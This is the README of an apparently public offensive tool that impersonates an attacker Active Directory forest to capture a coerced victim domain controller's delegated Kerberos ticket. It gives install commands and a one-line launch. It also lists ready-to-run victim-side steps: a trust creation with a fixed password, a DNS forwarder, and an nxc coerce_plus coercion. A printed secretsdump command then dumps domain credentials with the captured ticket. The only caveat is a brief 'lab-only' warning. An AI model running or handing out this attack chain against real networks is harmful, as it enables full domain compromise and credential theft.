# aorta-dc

> [!WARNING]
> **Lab-only tooling for authorized use.**

A single Python process that impersonates an attacker AD forest
(`bytestorm.local`) well enough to capture a coerced victim DC's **delegated
TGT**. No Windows is required.

| Port | Service | Purpose |
|---|---|---|
| UDP/53  | DNS   | answer `A dc01.<realm>` and `_kerberos`/`_ldap` SRV DC-locator queries |
| UDP/389 | CLDAP | Netlogon LDAP ping -> `NETLOGON_SAM_LOGON_RESPONSE_EX` |
| TCP/88  | Kerberos | stateless TGS-only KDC: mints `cifs/<dc>` with `ok-as-delegate` |
| TCP/445 | SMB   | built-in capture listener; accepts the Kerberos AP-REQ and saves the delegated TGT |

The victim side keeps using the standard tooling
([`aorta`](https://github.com/0xNDI/aorta) for trust + DNS forwarder,
[`nxc`](https://github.com/Pennyw0rth/NetExec)/`coerce_plus` for coercion).
When the first delegated TGT hits the disk, the responder **stops itself** and
prints the ready-to-paste follow-up (printed, never executed):

```
KRB5CCNAME='DC$@VICTIM.LOCAL_krbtgt@VICTIM.LOCAL.ccache' faketime -f '+7h' secretsdump.py -k -no-pass dc.victim.local
```

Victim DC name and clock skew are learned live (CLDAP ping `DnsHostName`,
referral authenticator `ctime`) — no manual measurement.

<img width="905" height="765" alt="image" src="https://github.com/user-attachments/assets/c7d1813d-e04a-4177-808f-1679f35b42d3" />

## Install

Using [uv](https://github.com/astral-sh/uv):

```bash
uv tool install git+https://github.com/0xNDI/aorta-dc
```

This provides the `aorta-dc` command.

## Usage

Only the **victim IP** is mandatory — anonymous recon (LDAP RootDSE, no
credentials) derives the victim realm and DC FQDN; the attacker identity
defaults to the `bytestorm.local` lab values and the trust password to
`Password__42`:

```bash
aorta-dc 10.129.56.222                      # that's the whole command
# optional overrides: --realm/--dc/--netbios/--sid/--trust-password (attacker),
# --victim-realm/--victim-dc (when recon is blocked; giving both skips recon),
# --ip (your VPN IP; auto-detected)
```

Victim side (the startup banner prints these with your values filled in):

```bash
aorta trust add -u <user> -d victim.local --dc dc.victim.local -p '<pw>' \
    --attacker-domain bytestorm.local --attacker-netbios bytestorm \
    --attacker-sid S-1-5-21-42-42-42 --trust-password 'Password__42'
aorta forwarder add -u <user> -d victim.local --dc dc.victim.local -p '<pw>' \
    --master <your-ip> --zone bytestorm.local
nxc smb victim.local -u <user> -p '<pw>' -M coerce_plus -o LISTENER=dc01.bytestorm.local
```

The responder exits by itself after the first captured ticket.

### Options worth knowing

* `--service-aes-key KEY` — explicit 32-byte hex key for `cifs/<dc>`. Default:
  a static lab key (same every run); `--random-service-key` generates a fresh
  one at each start instead. The banner prints the effective key either way.
* `--victim-realm` / `--victim-dc` — override recon results; supplying both
  skips recon entirely. `--victim-dc` also seeds the secretsdump target when
  the CLDAP ping cannot provide the victim hostname.
* `--debug` — verbose protocol logging; also prints the derived trust key.

## Dependencies

* [Python 3.11+](https://github.com/python/cpython),
  [impacket](https://github.com/fortra/impacket),
  [dnspython](https://github.com/rthalley/dnspython),
  [ldap3](https://github.com/cannatag/ldap3), and
  [pyasn1](https://github.com/pyasn1/pyasn1); the install command above handles
  these dependencies
* victim side: [aorta](https://github.com/0xNDI/aorta),
  [NetExec](https://github.com/Pennyw0rth/NetExec) (`nxc`);
  [secretsdump.py](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py) +
  [libfaketime](https://github.com/wolfcw/libfaketime) (`faketime`) for the
  printed follow-up

Privileged ports: binds UDP/53, UDP/389, TCP/88 and (built-in capture) TCP/445
on the selected interface. On Kali `net.ipv4.ip_unprivileged_port_start`
allows non-root binding; elsewhere run with elevated privileges for those
ports only.

## How it works / what is intentionally left out

* DNS ([dnspython](https://github.com/rthalley/dnspython)): A record for the
  DC and apex, SRV for `_kerberos`/`_ldap` variants under the realm, and SOA
  authority data for negative/NODATA
  responses. Unknown names return NXDOMAIN; unsupported record types at known
  in-zone names return NODATA. Never forwards. No TCP/53.
* CLDAP: exactly the Netlogon ping; the response follows the wire shape of a
  recorded answer, with values
  generated from the current configuration. Not an LDAP server.
* Kerberos: exactly one PA-TGS-REQ carrying the victim's referral TGT for
  `krbtgt/<ATTACKER>@<VICTIM>`, AES256 only, `cifs/<dc>` only. The incoming
  trust key is derived directly from the trust password
  (`string_to_key(AES256, pw, "<VICTIM>krbtgt<ATTACKER>")`). Reply/ticket
  semantics (flags `0x40ac0000` with
  `ok_as_delegate`, copied lifetimes, kvno 1, nonce echo) mirror captured
  exchanges. Replay protection: bounded LRU over (client, ctime, cusec).
  Everything else gets a precise `KRB_ERROR` and a log line.
* Clock: the victim's time basis is used throughout (ticket lifetimes copied,
  `starttime` from the authenticator) — **the attacker host clock never needs
  synchronizing**; the measured skew only feeds the printed
  [`faketime`](https://github.com/wolfcw/libfaketime) hint.
* Not implemented: AS exchanges, password changes, any Netlogon/RPC (so no
  `nltest /sc_verify`-style trust validation — not needed for capture).

## Credits

* AORTA attack: [SpecterOps](https://github.com/SpecterOps)
  ([Untrustworthy Trust Builders](https://specterops.io/blog/2025/06/25/untrustworthy-trust-builders-account-operators-replicating-trust-attack-aorta/))
* [krbrelayx](https://github.com/dirkjanm/krbrelayx)
* [impacket](https://github.com/fortra/impacket)
* [dnspython](https://github.com/rthalley/dnspython)
* [NetExec](https://github.com/Pennyw0rth/NetExec)
